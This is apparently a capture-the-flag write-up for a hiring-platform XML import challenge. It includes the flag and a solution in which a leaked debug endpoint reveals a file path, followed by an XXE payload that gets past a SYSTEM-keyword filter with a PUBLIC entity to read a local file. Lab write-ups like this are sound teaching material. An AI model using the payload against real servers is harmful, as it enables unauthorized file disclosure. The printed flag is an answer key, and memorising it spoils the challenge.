# Hire FLow

## Description:
Our hiring platform's new "import a candidate profile" feature parses XML files server-side and shows you a preview before adding them to the pipeline. Seems straightforward enough... but the dev team swears they "already thought about the security stuff."

Find the flag.

## Flag: BTWCTF{5y5t3m_bl0ck3d_pu6l1c_w0rk3d}

## Solution:

1. View the page source on `/`.

2. Notice the HTML comment referencing a debug endpoint.

3. Navigate to:

```text
/api?debug=1
```

4. The response reveals the application's internal configuration, including:

```json
{
  "dataDir": "/tmp/flag_store.dat"
}
```

5. Since the application accepts XML input, attempt a standard XXE payload using a `SYSTEM` entity pointing to `/tmp/flag_store.dat`.

6. The request is rejected with:

```text
Blocked: SYSTEM external entities are not permitted.
```

7. Observe that the filter only blocks the keyword `SYSTEM`. Replace it with a `PUBLIC` external entity declaration:

```xml
<?xml version="1.0"?>
<!DOCTYPE candidate [
  <!ENTITY xxe PUBLIC "-//ANY//TEXT//EN" "file:///tmp/flag_store.dat">
]>
<candidate>
  <name>&xxe;</name>
  <email>a</email>
  <position>b</position>
  <notes>c</notes>
</candidate>
```

8. Submit the XML payload to `/api`.

9. The parser resolves the external entity and reads the contents of `/tmp/flag_store.dat`.

10. The flag is returned in the response under:

```json
candidate.candidateName
```

11. Retrieve the flag and submit it. 🚩
